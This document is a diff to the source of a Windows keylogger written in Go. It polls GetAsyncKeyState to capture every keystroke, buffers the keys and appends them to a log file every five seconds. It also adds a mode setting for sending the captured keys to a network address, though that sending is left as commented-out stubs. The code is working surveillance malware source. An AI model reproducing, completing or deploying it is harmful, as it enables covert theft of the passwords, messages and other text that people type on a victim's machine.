@@ -1,7 +1,9 @@
 package main
 
 import (
-	//"fmt"
+	"fmt"
+	"io"
+	"os"
 	"syscall"
 	"time"
 )
@@ -133,6 +135,10 @@ var codes = map[int]string{
 	0xB1: "PREVTRACK",
 	0xB2: "STOP",
 	0xB3: "PLAY/PAUSE",
+	0xBB: "+",
+	0xBC: ",",
+	0xBD: "-",
+	0xBE: ".",
 }
 
 var (
@@ -140,18 +146,25 @@ var (
 	getState = user32.NewProc("GetAsyncKeyState")
 )
 
+// writer used to initialize the buffered reader
+type Writer int
+
 // represents the keylogger
 type keylogger struct {
+	// true if currently logging, false if not
+	active bool
+
+	// interval on which to flush the buffer (in seconds)
+	bufferInterval float64
+
 	// all keys
 	log []key
 
-	// controls whether keystrokes are saved to a file
-	saveToFile bool
-	filename   string
+	// 0 = save to file, 1 = send over network
+	mode int
 
-	// controls whether keystrokes are sent over the network
-	send  bool
-	ipdst string
+	filename string
+	ipdst    string
 }
 
 // information about key events (key presses/up/down)
@@ -166,10 +179,16 @@ type key struct {
 // starts logging and saving the data to a list where each element is a KEYDOWN or KEYUP event
 // should be called with 'go' keyword to run in background
 // time param is time in seconds to log for
-func (k *keylogger) startLogging(duration int) {
+func (k *keylogger) start(duration int) {
 
 	// logs last iteration of current keys so adjacent logs where the key's down field does not change can be discarded
 	prevCurrentKeys := []key{}
+
+	buffer := []key{}
+	// time in the last
+	lastBufferFlush := time.Now()
+
+	k.active = true
 
 	// loops for the given amount of seconds
 	for start := time.Now(); time.Since(start) < time.Second*time.Duration(duration); {
@@ -181,38 +200,95 @@ func (k *keylogger) startLogging(duration int) {
 			}
 
 			val, _, _ := getState.Call(uintptr(keycode))
+
+			// 32768 means down and is in the same state as last loop, 32769 means is down and changed state since the last loop
 			isDown := (val == 32768) || (val == 32769)
 			currentKeys = append(currentKeys, key{name: codes[keycode], down: isDown})
 		}
 
 		// check differences between current and previous key logs (they should be the same length)
+		// not using built in GetAsyncKeyState functionality for this because it is unreliable
 		if len(prevCurrentKeys) != 0 {
 			for i := 0; i < len(currentKeys); i++ {
 				if currentKeys[i].down != prevCurrentKeys[i].down { // then there was a change in state!
 					k.log = append(k.log, currentKeys[i])
+					buffer = append(buffer, currentKeys[i])
 				}
 			}
 		} else {
 			// has the function of 'extending' the slice
 			k.log = append(k.log, currentKeys...)
+			buffer = append(buffer, currentKeys...)
+
+		}
+
+		if time.Since(lastBufferFlush) > time.Duration(5)*time.Second {
+			if k.mode == 0 {
+				k.saveToFile(&buffer)
+			} else if k.mode == 1 {
+				// k.send(currentKeys)
+			}
+			lastBufferFlush = time.Now()
 		}
 
 		prevCurrentKeys = currentKeys
 		time.Sleep(10 * time.Millisecond) // limit logging to every 1/100 second
 	}
 
+	if k.mode == 0 {
+		k.saveToFile(&buffer)
+	} else if k.mode == 1 {
+		// k.send(currentKeys)
+	}
+	k.active = false
+
 }
 
-// set keylogger to record results in given file
-func (k *keylogger) setSaveToFile(filename string) {
-	k.saveToFile = true
-	k.send = false
-	k.filename = filename
+// returns all the events for when a key is pressed down
+func (k *keylogger) getDownEvents() []key {
+	downEvents := []key{}
+	for _, key := range k.log {
+		if key.down {
+			downEvents = append(downEvents, key)
+		}
+	}
+	return downEvents
 }
 
-// set keylogger to send results to given ip destination
-func (k *keylogger) setSend(ipdst string) {
-	k.send = true
-	k.saveToFile = false
-	k.ipdst = ipdst
+func (k *keylogger) setMode(mode int, info string) {
+	k.mode = mode
+	if k.mode == 0 {
+		k.filename = info
+	} else if k.mode == 1 {
+		k.ipdst = info
+	} else {
+		fmt.Println("ERROR: NOT A VALID LOGGING MODE")
+	}
+}
+
+func (k *keylogger) saveToFile(buffer *[]key) {
+	downEvents := []key{}
+	for _, key := range *buffer {
+		if key.down {
+			downEvents = append(downEvents, key)
+		}
+	}
+
+	f, err := os.OpenFile(k.filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644) // what??
+	check(err)
+	defer f.Close()
+
+	for _, key := range downEvents {
+		_, err := f.WriteString(key.name + " ")
+		check(err)
+	}
+
+	*buffer = nil
+}
+
+// stop running if there is an error
+func check(e error) {
+	if e != nil && e != io.EOF {
+		panic(e)
+	}
 }
